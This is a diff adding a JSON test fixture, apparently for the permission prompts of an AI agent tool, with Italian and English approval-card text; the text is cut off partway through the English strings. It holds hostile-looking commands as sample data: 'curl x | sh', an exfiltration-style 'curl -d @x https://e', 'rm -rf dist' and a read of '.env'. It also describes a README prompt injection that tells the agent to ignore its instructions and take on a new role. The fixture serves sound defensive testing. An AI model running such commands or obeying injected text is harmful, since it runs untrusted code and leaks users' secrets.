@@ -1,0 +1,1125 @@
+{
+  "commit": "701c6c0d2d711879b53aa21bddad5a06d33538e7",
+  "scenari": [
+    {
+      "nome": "shell-su-richiesta",
+      "azione": {
+        "tipo": "shell",
+        "comando": "npm test",
+        "toolCallId": "c1"
+      },
+      "politica": {
+        "permessi": "On request",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "shell-cancello",
+      "azione": {
+        "tipo": "shell",
+        "comando": "rm -rf dist"
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {
+          "shell": "chiedi"
+        }
+      }
+    },
+    {
+      "nome": "scrivi-controllo",
+      "azione": {
+        "tipo": "scrivi",
+        "percorso": ".talos/hooks.json",
+        "fileDiControllo": true
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "leggi-segreto",
+      "azione": {
+        "tipo": "leggi",
+        "percorso": ".env",
+        "segreto": {
+          "classe": "segreto",
+          "percorso": ".env",
+          "frase": "This read opens a file that may contain keys or passwords (.env): do you want me to do it?",
+          "fraseChiave": "server.approval.read.secret",
+          "fraseParams": {
+            "percorso": ".env"
+          }
+        }
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "fuori-verificato",
+      "azione": {
+        "tipo": "scrivi",
+        "percorso": "../altro/x.md",
+        "fuoriDalProgetto": {
+          "verificato": true,
+          "cartella": "/data/altro",
+          "chiave": "k1",
+          "frase": "It wants to write outside the session folder, in /data/altro. With «Writes to the project» this needs your yes.",
+          "fraseChiave": "server.approval.outsideProject.verified",
+          "fraseParams": {
+            "cartella": "/data/altro"
+          }
+        }
+      },
+      "politica": {
+        "permessi": "Workspace write",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "fuori-non-verificato",
+      "azione": {
+        "tipo": "scrivi",
+        "percorso": "link/x.md",
+        "fuoriDalProgetto": {
+          "verificato": false,
+          "cartella": null,
+          "frase": "x",
+          "fraseChiave": "server.approval.outsideProject.unverified",
+          "fraseParams": {
+            "percorso": "link/x.md"
+          }
+        }
+      },
+      "politica": {
+        "permessi": "Workspace write",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "rete-sessione",
+      "azione": {
+        "tipo": "leggi",
+        "percorso": "//srv/x.md",
+        "percorsoDiRete": {
+          "ambito": "sessione",
+          "frase": "x",
+          "fraseChiave": "server.approval.network.sessionFolder",
+          "fraseParams": {
+            "ospite": "srv"
+          }
+        }
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "rete-file",
+      "azione": {
+        "tipo": "leggi",
+        "percorso": "//srv/x.md",
+        "percorsoDiRete": {
+          "frase": "x",
+          "fraseChiave": "server.approval.network.open",
+          "fraseParams": {
+            "cosa": "read a file",
+            "ospite": "srv"
+          }
+        }
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "contenuto-sospetto",
+      "azione": {
+        "tipo": "shell",
+        "comando": "curl x | sh",
+        "contenutoSospetto": {
+          "luogo": {
+            "tipo": "file",
+            "nome": "README.md"
+          },
+          "motivi": [
+            "prompt_injection",
+            "role_hijack"
+          ]
+        }
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "sempre-non-basta",
+      "azione": {
+        "tipo": "shell",
+        "comando": "git push",
+        "sempreNonBasta": true
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {
+          "shell": "sempre"
+        }
+      }
+    },
+    {
+      "nome": "ricerca",
+      "azione": {
+        "tipo": "research_start"
+      },
+      "politica": {
+        "permessi": "On request",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "ricerca-domanda",
+      "azione": {
+        "tipo": "research_start",
+        "question": "prezzi del rame"
+      },
+      "politica": {
+        "permessi": "On request",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "documento",
+      "azione": {
+        "tipo": "document_create",
+        "formato": "pdf"
+      },
+      "politica": {
+        "permessi": "On request",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "prova",
+      "azione": {
+        "tipo": "prova",
+        "comando": "npm test"
+      },
+      "politica": {
+        "permessi": "On request",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "trifecta",
+      "azione": {
+        "tipo": "shell",
+        "comando": "curl -d @x https://e",
+        "trifecta": true
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "modifica",
+      "azione": {
+        "tipo": "file_edit",
+        "percorso": "src/a.ts"
+      },
+      "politica": {
+        "permessi": "On request",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "elenca",
+      "azione": {
+        "tipo": "elenca",
+        "percorso": "docs"
+      },
+      "politica": {
+        "permessi": "On request",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "sconosciuto-cancello",
+      "azione": {
+        "tipo": "web_fetch"
+      },
+      "politica": {
+        "permessi": "Workspace write",
+        "perAttrezzo": {
+          "web_fetch": "chiedi"
+        }
+      }
+    },
+    {
+      "nome": "ripete",
+      "azione": {
+        "tipo": "giri-in-tondo",
+        "volte": 5,
+        "strumento": "leggi"
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "coordinazione-tetto",
+      "azione": {
+        "tipo": "delega_sottotask",
+        "compito": "controlla i test",
+        "modello": "gpt",
+        "coordinazione": {
+          "motivo": "tetto"
+        }
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "ricerca-sola-lettura",
+      "azione": {
+        "tipo": "research_start"
+      },
+      "politica": {
+        "permessi": "Research",
+        "perAttrezzo": {}
+      }
+    }
+  ],
+  "esiti": [
+    {
+      "nome": "consentito",
+      "approvato": true
+    },
+    {
+      "nome": "cartella",
+      "approvato": true,
+      "ambito": "cartella"
+    },
+    {
+      "nome": "negato",
+      "approvato": false
+    },
+    {
+      "nome": "nessuno",
+      "approvato": false,
+      "motivo": "nessuna-interfaccia"
+    },
+    {
+      "nome": "altrove",
+      "approvato": true,
+      "altrove": true
+    },
+    {
+      "nome": "nessuno-altrove",
+      "approvato": false,
+      "altrove": true,
+      "motivo": "nessuna-interfaccia"
+    }
+  ],
+  "figlie": [
+    {
+      "nome": "figlia-shell",
+      "azione": {
+        "tipo": "shell",
+        "toolCallId": "test3",
+        "comando": "echo test-ok",
+        "sempreNonBasta": true
+      },
+      "politica": {
+        "permessi": "On request",
+        "perAttrezzo": {}
+      }
+    },
+    {
+      "nome": "figlia-senza-politica",
+      "azione": {
+        "tipo": "shell",
+        "toolCallId": "test3",
+        "comando": "echo test-ok",
+        "sempreNonBasta": true
+      },
+      "politica": null
+    },
+    {
+      "nome": "figlia-permessi-illeggibili",
+      "azione": {
+        "tipo": "shell",
+        "comando": "ls"
+      },
+      "politica": {
+        "permessi": null,
+        "perAttrezzo": {
+          "shell": "chiedi"
+        }
+      }
+    },
+    {
+      "nome": "figlia-cancello",
+      "azione": {
+        "tipo": "scrivi",
+        "percorso": "x.md"
+      },
+      "politica": {
+        "permessi": "Full access",
+        "perAttrezzo": {
+          "scrivi": "chiedi"
+        }
+      }
+    },
+    {
+      "nome": "figlia-segreto-senza-politica",
+      "azione": {
+        "tipo": "leggi",
+        "percorso": ".env",
+        "segreto": {
+          "classe": "segreto",
+          "percorso": ".env",
+          "frase": "This read opens a file that may contain keys or passwords (.env): do you want me to do it?",
+          "fraseChiave": "server.approval.read.secret",
+          "fraseParams": {
+            "percorso": ".env"
+          }
+        }
+      },
+      "politica": null
+    }
+  ],
+  "it": {
+    "carte": {
+      "shell-su-richiesta": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "npm test",
+        "perche": "Vuole eseguire questo comando nel terminale:",
+        "codice": "npm test",
+        "motivo": "Chiede perché la sessione è su «Chiede prima»: ogni azione che cambia qualcosa passa da te.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "shell-cancello": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "rm -rf dist",
+        "perche": "Vuole eseguire questo comando nel terminale:",
+        "codice": "rm -rf dist",
+        "motivo": "Chiede perché la regola di «Comando nel terminale» è «Chiedi conferma», anche con la sessione su «Accesso pieno».",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "scrivi-controllo": {
+        "badge": "Chiede di scrivere",
+        "bersaglio": ".talos/hooks.json",
+        "perche": "Vuole scrivere un file di controllo di TALOS: una regola dell’agente (hook, MCP, istruzioni, memoria), non un file del progetto.",
+        "codice": ".talos/hooks.json",
+        "motivo": "Chiede perché il kernel considera questa azione da confermare, anche con la sessione su «Accesso pieno».",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "leggi-segreto": {
+        "badge": "Chiede di leggere",
+        "bersaglio": ".env",
+        "perche": "Vuole leggere questo file:",
+        "codice": ".env",
+        "motivo": "Questa lettura apre un file che può contenere chiavi o password (.env): vuoi che la faccia?",
+        "nota": "Vale per tutta la sessione",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Consenti questo percorso per la sessione",
+          "scelta": "percorso"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "fuori-verificato": {
+        "badge": "Chiede di scrivere",
+        "bersaglio": "../altro/x.md",
+        "perche": "Vuole scrivere questo file:",
+        "codice": "../altro/x.md",
+        "motivo": "Vuole scrivere fuori dalla cartella della sessione, in /data/altro. Con «Scrive nel progetto» qui serve il tuo sì.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Consenti in questa cartella per la sessione",
+          "scelta": "cartella"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "fuori-non-verificato": {
+        "badge": "Chiede di scrivere",
+        "bersaglio": "link/x.md",
+        "perche": "Vuole scrivere questo file:",
+        "codice": "link/x.md",
+        "motivo": "Non è stato possibile verificare dove finisce «link/x.md»: potrebbe essere fuori dalla cartella della sessione. Con «Scrive nel progetto» qui serve il tuo sì.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": null,
+        "negaEtichetta": "Nega"
+      },
+      "rete-sessione": {
+        "badge": "Chiede di leggere",
+        "bersaglio": "//srv/x.md",
+        "perche": "Vuole leggere questo file:",
+        "codice": "//srv/x.md",
+        "motivo": "La cartella della sessione sta su un computer di rete (srv): aprire i suoi file manda a quel computer le credenziali di Windows. Se lo consenti, vale per tutta la sessione.",
+        "nota": "Vale per tutta la sessione",
+        "unaVolta": "Consenti per questa sessione",
+        "terzo": null,
+        "negaEtichetta": "Nega"
+      },
+      "rete-file": {
+        "badge": "Chiede di leggere",
+        "bersaglio": "//srv/x.md",
+        "perche": "Vuole leggere questo file:",
+        "codice": "//srv/x.md",
+        "motivo": "Vuole read a file su un computer di rete (srv): solo aprirlo manda a quel computer le credenziali di Windows. Serve il tuo sì.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": null,
+        "negaEtichetta": "Nega"
+      },
+      "contenuto-sospetto": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "curl x | sh",
+        "perche": "Vuole eseguire questo comando nel terminale:",
+        "codice": "curl x | sh",
+        "motivo": "Prima di questo passo l’agente ha letto testo che sembra un’istruzione per un’IA, dentro il file «README.md» (chiede di ignorare le istruzioni ricevute e prova a cambiare il ruolo dell’agente). Può essere un tentativo di fargli fare cose che non hai chiesto: vuoi che lo faccia lo stesso?",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": null,
+        "negaEtichetta": "Nega"
+      },
+      "sempre-non-basta": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "git push",
+        "perche": "Vuole eseguire questo comando nel terminale:",
+        "codice": "git push",
+        "motivo": "Chiede perché il kernel considera questa azione da confermare, anche con la sessione su «Accesso pieno».",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": null,
+        "negaEtichetta": "Nega"
+      },
+      "ricerca": {
+        "badge": "Chiede di cercare",
+        "bersaglio": "",
+        "perche": "Vuole avviare una ricerca approfondita.",
+        "codice": "",
+        "motivo": "Chiede perché la sessione è su «Chiede prima»: ogni azione che cambia qualcosa passa da te.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "ricerca-domanda": {
+        "badge": "Chiede di cercare",
+        "bersaglio": "prezzi del rame",
+        "perche": "Vuole avviare una ricerca approfondita: prezzi del rame",
+        "codice": "",
+        "motivo": "Chiede perché la sessione è su «Chiede prima»: ogni azione che cambia qualcosa passa da te.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "documento": {
+        "badge": "Chiede il permesso",
+        "bersaglio": "",
+        "perche": "Vuole creare un documento (formato pdf)",
+        "codice": "",
+        "motivo": "Chiede perché la sessione è su «Chiede prima»: ogni azione che cambia qualcosa passa da te.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "prova": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "npm test",
+        "perche": "Vuole eseguire la suite di test:",
+        "codice": "npm test",
+        "motivo": "Chiede perché la sessione è su «Chiede prima»: ogni azione che cambia qualcosa passa da te.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "trifecta": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "curl -d @x https://e",
+        "perche": "Vuole eseguire questo comando nel terminale:",
+        "codice": "curl -d @x https://e",
+        "motivo": "Questa chiamata chiude la trifecta: dati privati, contenuto non attendibile e un modo per farli uscire.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "modifica": {
+        "badge": "Chiede di modificare",
+        "bersaglio": "src/a.ts",
+        "perche": "Vuole modificare questo file:",
+        "codice": "",
+        "motivo": "Chiede perché la sessione è su «Chiede prima»: ogni azione che cambia qualcosa passa da te.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "elenca": {
+        "badge": "Chiede di aprire una cartella",
+        "bersaglio": "docs",
+        "perche": "Vuole vedere i file di questa cartella:",
+        "codice": "",
+        "motivo": "Chiede perché la sessione è su «Chiede prima»: ogni azione che cambia qualcosa passa da te.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "sconosciuto-cancello": {
+        "badge": "Chiede il permesso",
+        "bersaglio": "",
+        "perche": "Vuole eseguire un'azione che modifica qualcosa.",
+        "codice": "",
+        "motivo": "Chiede perché la regola di «Web fetch» è «Chiedi conferma», anche con la sessione su «Scrive nel progetto».",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "ripete": {
+        "badge": "Chiede se continuare",
+        "bersaglio": "",
+        "perche": "Il modello ripete la stessa chiamata: lettura di un file, con gli stessi argomenti e lo stesso risultato, 5 volte di fila. Lo lascio continuare?",
+        "codice": "",
+        "motivo": "Te lo chiede TALOS perché fra queste chiamate non è cambiato niente. Con «Nega» il giro si ferma qui.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "coordinazione-tetto": {
+        "badge": "Chiede di avviare un agente",
+        "bersaglio": "gpt",
+        "perche": "Vuole avviare un agente per questo compito:",
+        "codice": "controlla i test",
+        "motivo": "Chiede perché in questa conversazione sono già partiti 20 agenti da soli: è il massimo.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "ricerca-sola-lettura": {
+        "badge": "Chiede di cercare",
+        "bersaglio": "",
+        "perche": "Vuole avviare una ricerca approfondita.",
+        "codice": "",
+        "motivo": "Chiede perché il kernel considera questa azione da confermare, anche con la sessione su «Solo ricerca».",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      }
+    },
+    "esiti": {
+      "consentito": "Approvato",
+      "cartella": "Consentito in questa cartella per la sessione",
+      "negato": "Negato",
+      "nessuno": "Negato: nessuno poteva rispondere in questa sessione automatica",
+      "altrove": "Approvato da un’altra finestra",
+      "nessuno-altrove": "Negato: nessuno poteva rispondere in questa sessione automatica"
+    },
+    "figlie": {
+      "figlia-shell": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "echo test-ok",
+        "perche": "Vuole eseguire questo comando nel terminale:",
+        "codice": "echo test-ok",
+        "motivo": "Chiede perché la sessione è su «Chiede prima»: ogni azione che cambia qualcosa passa da te.",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": null,
+        "negaEtichetta": "Nega"
+      },
+      "figlia-senza-politica": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "echo test-ok",
+        "perche": "Vuole eseguire questo comando nel terminale:",
+        "codice": "echo test-ok",
+        "motivo": "",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": null,
+        "negaEtichetta": "Nega"
+      },
+      "figlia-permessi-illeggibili": {
+        "badge": "Chiede di eseguire",
+        "bersaglio": "ls",
+        "perche": "Vuole eseguire questo comando nel terminale:",
+        "codice": "ls",
+        "motivo": "",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "figlia-cancello": {
+        "badge": "Chiede di scrivere",
+        "bersaglio": "x.md",
+        "perche": "Vuole scrivere questo file:",
+        "codice": "x.md",
+        "motivo": "Chiede perché la regola di «Scrittura di un file» è «Chiedi conferma», anche con la sessione su «Accesso pieno».",
+        "nota": "Vale solo per questa richiesta",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Per questa sessione",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Nega"
+      },
+      "figlia-segreto-senza-politica": {
+        "badge": "Chiede di leggere",
+        "bersaglio": ".env",
+        "perche": "Vuole leggere questo file:",
+        "codice": ".env",
+        "motivo": "Questa lettura apre un file che può contenere chiavi o password (.env): vuoi che la faccia?",
+        "nota": "Vale per tutta la sessione",
+        "unaVolta": "Consenti una volta",
+        "terzo": {
+          "etichetta": "Consenti questo percorso per la sessione",
+          "scelta": "percorso"
+        },
+        "negaEtichetta": "Nega"
+      }
+    },
+    "chi": {
+      "prima": "L’agente «",
+      "dopo": "» chiede",
+      "senza": "Un agente chiede"
+    }
+  },
+  "en": {
+    "carte": {
+      "shell-su-richiesta": {
+        "badge": "Asks to run",
+        "bersaglio": "npm test",
+        "perche": "It wants to run this command in the terminal:",
+        "codice": "npm test",
+        "motivo": "It asks because the session is on “Asks first”: every action that changes something goes through you.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "shell-cancello": {
+        "badge": "Asks to run",
+        "bersaglio": "rm -rf dist",
+        "perche": "It wants to run this command in the terminal:",
+        "codice": "rm -rf dist",
+        "motivo": "It asks because the rule for “Terminal command” is “Ask for confirmation”, even with the session on “Full access”.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "scrivi-controllo": {
+        "badge": "Asks to write",
+        "bersaglio": ".talos/hooks.json",
+        "perche": "It wants to write a TALOS control file: an agent rule (hook, MCP, instructions, memory), not a project file.",
+        "codice": ".talos/hooks.json",
+        "motivo": "It asks because the kernel treats this action as one to confirm, even with the session on “Full access”.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "leggi-segreto": {
+        "badge": "Asks to read",
+        "bersaglio": ".env",
+        "perche": "It wants to read this file:",
+        "codice": ".env",
+        "motivo": "This read opens a file that may contain keys or passwords (.env): do you want me to do it?",
+        "nota": "Applies to the whole session",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "Allow this path for the session",
+          "scelta": "percorso"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "fuori-verificato": {
+        "badge": "Asks to write",
+        "bersaglio": "../altro/x.md",
+        "perche": "It wants to write this file:",
+        "codice": "../altro/x.md",
+        "motivo": "It wants to write outside the session folder, in /data/altro. With «Writes to the project» this needs your yes.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "Allow in this folder for the session",
+          "scelta": "cartella"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "fuori-non-verificato": {
+        "badge": "Asks to write",
+        "bersaglio": "link/x.md",
+        "perche": "It wants to write this file:",
+        "codice": "link/x.md",
+        "motivo": "It could not be verified where «link/x.md» ends up: it may be outside the session folder. With «Writes to the project» this needs your yes.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": null,
+        "negaEtichetta": "Deny"
+      },
+      "rete-sessione": {
+        "badge": "Asks to read",
+        "bersaglio": "//srv/x.md",
+        "perche": "It wants to read this file:",
+        "codice": "//srv/x.md",
+        "motivo": "The session folder is on a network computer (srv): opening its files sends your Windows credentials to that computer. If you allow it, it applies to the whole session.",
+        "nota": "Applies to the whole session",
+        "unaVolta": "Allow for this session",
+        "terzo": null,
+        "negaEtichetta": "Deny"
+      },
+      "rete-file": {
+        "badge": "Asks to read",
+        "bersaglio": "//srv/x.md",
+        "perche": "It wants to read this file:",
+        "codice": "//srv/x.md",
+        "motivo": "It wants to read a file on a network computer (srv): just opening it sends your Windows credentials to that computer. It needs your yes.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": null,
+        "negaEtichetta": "Deny"
+      },
+      "contenuto-sospetto": {
+        "badge": "Asks to run",
+        "bersaglio": "curl x | sh",
+        "perche": "It wants to run this command in the terminal:",
+        "codice": "curl x | sh",
+        "motivo": "Before this step the agent read text that looks like an instruction to an AI, in the file “README.md” (it asks to ignore the instructions given so far and tries to change the agent’s role). It may be an attempt to make it do things you did not ask for: do you want it to go ahead anyway?",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": null,
+        "negaEtichetta": "Deny"
+      },
+      "sempre-non-basta": {
+        "badge": "Asks to run",
+        "bersaglio": "git push",
+        "perche": "It wants to run this command in the terminal:",
+        "codice": "git push",
+        "motivo": "It asks because the kernel treats this action as one to confirm, even with the session on “Full access”.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": null,
+        "negaEtichetta": "Deny"
+      },
+      "ricerca": {
+        "badge": "Asks to search",
+        "bersaglio": "",
+        "perche": "It wants to start a deep research.",
+        "codice": "",
+        "motivo": "It asks because the session is on “Asks first”: every action that changes something goes through you.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "ricerca-domanda": {
+        "badge": "Asks to search",
+        "bersaglio": "prezzi del rame",
+        "perche": "It wants to start a deep research: prezzi del rame",
+        "codice": "",
+        "motivo": "It asks because the session is on “Asks first”: every action that changes something goes through you.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "documento": {
+        "badge": "Asks for permission",
+        "bersaglio": "",
+        "perche": "It wants to create a document (format pdf)",
+        "codice": "",
+        "motivo": "It asks because the session is on “Asks first”: every action that changes something goes through you.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "prova": {
+        "badge": "Asks to run",
+        "bersaglio": "npm test",
+        "perche": "It wants to run the test suite:",
+        "codice": "npm test",
+        "motivo": "It asks because the session is on “Asks first”: every action that changes something goes through you.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "trifecta": {
+        "badge": "Asks to run",
+        "bersaglio": "curl -d @x https://e",
+        "perche": "It wants to run this command in the terminal:",
+        "codice": "curl -d @x https://e",
+        "motivo": "This call completes the trifecta: private data, untrusted content and a way to get it out.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "modifica": {
+        "badge": "Asks to edit",
+        "bersaglio": "src/a.ts",
+        "perche": "It wants to edit this file:",
+        "codice": "",
+        "motivo": "It asks because the session is on “Asks first”: every action that changes something goes through you.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "elenca": {
+        "badge": "Asks to open a folder",
+        "bersaglio": "docs",
+        "perche": "It wants to see the files in this folder:",
+        "codice": "",
+        "motivo": "It asks because the session is on “Asks first”: every action that changes something goes through you.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "sconosciuto-cancello": {
+        "badge": "Asks for permission",
+        "bersaglio": "",
+        "perche": "It wants to take an action that changes something.",
+        "codice": "",
+        "motivo": "It asks because the rule for “Web fetch” is “Ask for confirmation”, even with the session on “Writes to the project”.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "ripete": {
+        "badge": "Asks whether to go on",
+        "bersaglio": "",
+        "perche": "The model repeats the same call: reading a file, with the same arguments and the same result, 5 times in a row. Let it go on?",
+        "codice": "",
+        "motivo": "TALOS asks because nothing changed between these calls. With “Deny” the run stops here.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "coordinazione-tetto": {
+        "badge": "Asks to start an agent",
+        "bersaglio": "gpt",
+        "perche": "It wants to start an agent for this task:",
+        "codice": "controlla i test",
+        "motivo": "It asks because 20 agents have already started on their own in this conversation: that is the most allowed.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      },
+      "ricerca-sola-lettura": {
+        "badge": "Asks to search",
+        "bersaglio": "",
+        "perche": "It wants to start a deep research.",
+        "codice": "",
+        "motivo": "It asks because the kernel treats this action as one to confirm, even with the session on “Research only”.",
+        "nota": "Applies only to this request",
+        "unaVolta": "Allow once",
+        "terzo": {
+          "etichetta": "For this session",
+          "scelta": "sessione"
+        },
+        "negaEtichetta": "Deny"
+      }
+    },
+    "esiti": {
+      "consentito": "Approved",
+      "cartella": "Allowed in this folder for the session",
+      "negato": "Denied",
+      "nessuno": "Denied: no one could answer in this automatic session",
+      "altrove": "Approved from another window",
+      "nessuno-altrove": "Denied: no one could answer in this automatic session"
+    },
+    "figlie": {
+      "figlia-shell": {
+        "badge": "Asks to run",
+        "bersaglio": "echo test-ok",
+        "perche": "It wants to run this command in the terminal:",
+        "codice": "echo test-ok",
